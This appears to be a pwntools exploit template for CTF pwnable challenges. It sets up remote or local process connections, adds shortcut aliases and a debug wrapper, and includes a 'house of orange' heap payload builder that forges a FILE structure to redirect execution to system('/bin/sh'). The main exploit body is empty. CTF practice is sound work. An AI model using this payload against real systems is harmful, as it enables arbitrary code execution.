#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety <anciety@anciety-pc>
#
# Distributed under terms of the MIT license.
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['lxterminal', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)


# by w1tcher who dominates pwnable challenges
def house_of_orange(head_addr, system_addr, io_list_all):
    payload = b'/bin/sh\x00'
    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return payload


orig_attach = gdb.attach
def gdb_attach(*args, **kwargs):
    if DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach


def main():
    # Your exploit script goes here
    pass

if __name__ == '__main__':
    main()
